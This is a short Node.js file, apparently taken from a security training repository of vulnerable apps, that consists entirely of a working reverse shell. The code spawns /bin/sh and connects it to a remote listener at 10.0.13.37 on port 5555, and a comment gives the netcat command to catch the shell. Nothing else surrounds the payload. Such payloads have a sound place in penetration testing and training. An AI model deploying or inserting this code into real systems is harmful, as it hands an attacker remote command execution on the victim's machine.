
// Original: https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
// Nodejs reverse shell
// listen with: nc -vlnp 5555

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(5555, "10.0.13.37", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();